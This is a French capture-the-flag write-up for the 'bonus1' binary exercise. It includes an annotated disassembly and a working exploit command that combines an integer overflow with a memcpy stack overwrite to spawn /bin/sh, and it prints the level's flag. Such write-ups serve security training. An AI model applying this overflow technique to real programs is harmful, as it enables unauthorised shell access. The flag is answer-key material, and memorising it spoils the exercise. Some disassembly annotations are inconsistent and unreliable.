@@ -1,0 +1,99 @@
+Premier test : si notre atoi(argv1) > 9 => exit
+Donc argv1 doit etre < 9
+Second test plus tard, k doit être = à 0x574f4c46
+il y a un memcpy qui copie k*4 chars de argv2 dans le buffer (40).
+
+
+
+Pile : 
+
+
+
+< esp > esp (0xbffff6a0)
+   ...
+<esp+20> début buffer (0xbffff6b4)
+         |
+         |
+         |  Buffer (40chars)
+         |
+         |
+<esp+56> fin buffer
+<esp+60> k  (0xbffff6dc)
+<esp+72> ebp  (0xbffff6e8) 
+
+
+
+Donc on doit écrire 40 chars + k = 0x574f4c46
+Et argv1 doit donc être négatif mais multiplié par 4 puis casté doit être >=44
+
+=> -2147483637
+
+./bonus1 -2147483637 $(python -c "print('B' * 40 + '\x57\x4f\x4c\x46'[::-1])")
+
+==> 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+
+
+#include <stdio.h>
+  #include <limits.h>
+
+int main(){
+   int i = INT_MIN;
+
+   while (i<0) {
+      if ((size_t)(i*4) >= 44)
+         break;
+      i++;
+   }
+   printf("%d\n", i);
+   return 0;
+}
+          
+          
+
+
+
+Dump of assembler code for function main:
+   0x08048424 <+0>:     push   ebp
+   0x08048425 <+1>:     mov    ebp,esp
+   0x08048427 <+3>:     and    esp,0xfffffff0
+   0x0804842a <+6>:     sub    esp,0x40 => 64
+   0x0804842d <+9>:     mov    eax,DWORD PTR [ebp+0xc] => 0xbffff8ed: "/home/user/bonus1/bonus1" 
+   0x08048430 <+12>:    add    eax,0x4 => eax = 0xbffff906: "argv1" ("9")
+   0x08048433 <+15>:    mov    eax,DWORD PTR [eax] => eax = "argv1" ("9")
+   0x08048435 <+17>:    mov    DWORD PTR [esp],eax
+   0x08048438 <+20>:    call   0x8048360 <atoi@plt> => atoi("42")
+
+   0x0804843d <+25>:    mov    DWORD PTR [esp+0x3c],eax
+   0x08048441 <+29>:    cmp    DWORD PTR [esp+0x3c],0x9
+   0x08048446 <+34>:    jle    0x804844f <main+43> => si argv1 <= 9 ==> main+43 sinon main+127 (leave)
+
+   0x08048448 <+36>:    mov    eax,0x1
+   0x0804844d <+41>:    jmp    0x80484a3 <main+127>
+
+   0x0804844f <+43>:    mov    eax,DWORD PTR [esp+0x3c] => 0x00000009
+   0x08048453 <+47>:    lea    ecx,[eax*4+0x0] => 9*4 = 36 => ecx = 0x24
+   0x0804845a <+54>:    mov    eax,DWORD PTR [ebp+0xc] => eax = 0xbffff8f1:      "/home/user/bonus1/bonus1"
+   0x0804845d <+57>:    add    eax,0x8 => 0xbffff90c:      "argv2"
+   0x08048460 <+60>:    mov    eax,DWORD PTR [eax] => eax = "argv2"
+   0x08048462 <+62>:    mov    edx,eax => edx = "argv2"
+   0x08048464 <+64>:    lea    eax,[esp+0x14] =>  eax = 0x16
+   0x08048468 <+68>:    mov    DWORD PTR [esp+0x8],ecx
+   0x0804846c <+72>:    mov    DWORD PTR [esp+0x4],edx
+   0x08048470 <+76>:    mov    DWORD PTR [esp],eax
+   0x08048473 <+79>:    call   0x8048320 <memcpy@plt> memcpy(eax=int(argv[1]), src = argv2, int(argv[1])*4)
+
+   0x08048478 <+84>:    cmp    DWORD PTR [esp+0x3c],0x574f4c46 => destination has to be => 0x574f4c46
+
+   0x08048480 <+92>:    jne    0x804849e <main+122>
+
+   0x08048482 <+94>:    mov    DWORD PTR [esp+0x8],0x0 => 0
+   0x0804848a <+102>:   mov    DWORD PTR [esp+0x4],0x8048580 => "sh"
+   0x08048492 <+110>:   mov    DWORD PTR [esp],0x8048583 => "/bin/sh"
+   0x08048499 <+117>:   call   0x8048350 <execl@plt> => execl("/bin/sh", "sh", (char *) NULL);
+
+   0x0804849e <+122>:   mov    eax,0x0
+   0x080484a3 <+127>:   leave
+   0x080484a4 <+128>:   ret
+
+
+
